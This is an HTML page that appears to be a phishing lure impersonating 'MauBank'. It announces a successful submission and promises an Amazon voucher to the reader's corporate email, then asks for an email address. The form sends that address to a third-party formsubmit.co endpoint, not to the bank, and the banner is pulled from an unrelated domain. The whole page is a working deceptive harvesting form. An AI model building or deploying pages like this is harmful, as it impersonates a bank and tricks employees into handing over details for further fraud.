<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MauBank - Email Submission</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #333;
            color: #fff;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        .container {
            padding: 20px;
        }
        .banner {
            width: 70%;
            margin-bottom: 10px;
        }
        .success-message {
            background-color: #4CAF50;
            color: #fff;
            padding: 20px;
            border-radius: 5px;
            margin: 20px auto;
            max-width: 600px;
            font-size: 18px;
        }
        .amazon-logo {
            width: 100px;
            margin-top: 10px;
        }
        .message-text {
            font-size: 16px;
            color: #fff;
            margin-top: 15px;
        }
        .form-container {
            margin-top: 30px;
        }
        input[type="email"] {
            padding: 10px;
            font-size: 16px;
            margin-top: 10px;
            width: 70%;
            border: none;
            border-radius: 5px;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://hdway.in/static/banner.png" alt="MauBank Banner" class="banner" />

        <div class="success-message">
            <h2>Submission Successful!</h2>
            <p>Your response has been submitted successfully.</p>
            <p>You will receive your Amazon voucher within 48 hours on your corporate email.</p>
            <img src="https://upload.wikimedia.org/wikipedia/commons/d/de/Amazon_icon.png" alt="Amazon Logo" class="amazon-logo" />
        </div>

        <p class="message-text">Thank you for participating in this exclusive offer from MauBank!</p>

        <!-- Email Form Section -->
        <div class="form-container">
            <h3>Submit Your Email</h3>
            <form action="https://formsubmit.co/el/xahexe" method="POST">
                <input type="email" name="email" placeholder="Enter your email" required />
                <input type="submit" value="Submit" />
            </form>
        </div>
    </div>
</body>
</html>
